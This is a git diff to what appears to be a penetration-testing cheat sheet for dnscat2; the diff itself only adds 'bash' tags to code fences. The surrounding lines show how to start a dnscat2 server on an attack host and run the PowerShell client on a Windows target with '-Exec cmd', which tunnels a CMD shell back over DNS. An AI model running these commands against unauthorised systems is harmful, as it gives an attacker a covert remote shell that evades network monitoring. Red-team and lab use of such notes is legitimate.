@@ -14,7 +14,7 @@ sudo bundle install
 
 Clone the repository and install Ruby dependencies.
 
-```
+```bash
 sudo ruby dnscat2.rb --dns host=<lhost>,port=53,domain=<domain> --no-cache
 ```
 
@@ -23,7 +23,7 @@ Start the dnscat2 server. `host` attack host IP, `port` DNS port, `domain` targe
 ---
 ## Client Setup (Windows Target)
 
-```
+```bash
 git clone https://github.com/lukebaggett/dnscat2-powershell.git
 ```
 
@@ -41,7 +41,7 @@ Start-Dnscat2 -DNSserver <lhost> -Domain <domain> -PreSharedSecret <secret> -Exe
 
 Establish the tunnel back to the attack host. `-DNSserver` attack host IP, `-Domain` target domain, `-PreSharedSecret` secret from server output, `-Exec cmd` sends a CMD shell session through the tunnel.
 
-```
+```bash
 dnscat2> window -i 1
 ```
 
